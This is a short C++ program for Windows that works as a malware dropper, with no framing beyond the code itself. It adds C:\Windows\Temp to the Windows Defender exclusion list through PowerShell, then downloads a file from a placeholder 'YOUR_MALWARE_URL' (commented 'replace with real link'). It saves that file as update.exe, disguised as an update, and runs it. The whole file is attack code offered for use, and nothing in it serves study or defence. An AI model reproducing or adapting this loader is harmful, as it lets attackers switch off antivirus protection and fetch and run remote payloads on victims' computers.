#include <iostream>
#include <windows.h> 
#include <string>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
bool addExclusion(const std::string& path) {
    std::string cmd = "powershell.exe Add-MpPreference -ExclusionPath " + path;
    system(cmd.c_str());
    return true;
}
bool downloadFile(const char* url, const char* dest) {
    HINTERNET hInternet = InternetOpen("Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    
    HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    
    HANDLE hWrite = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    char buffer[1024];
    DWORD bytesRead = 0;
    
    while(InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        WriteFile(hWrite, buffer, bytesRead, &bytesRead, NULL);
    }
    
    CloseHandle(hWrite);
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
    
    return true;
}
int main() {
    const char* url = "YOUR_MALWARE_URL"; //replace with real link
    const char* filePath = "C:\\Windows\\Temp\\update.exe";
    addExclusion("C:\\Windows\\Temp");
    
    if(downloadFile(url, filePath)) {
        system(filePath);
    }
    
    return 0;
}
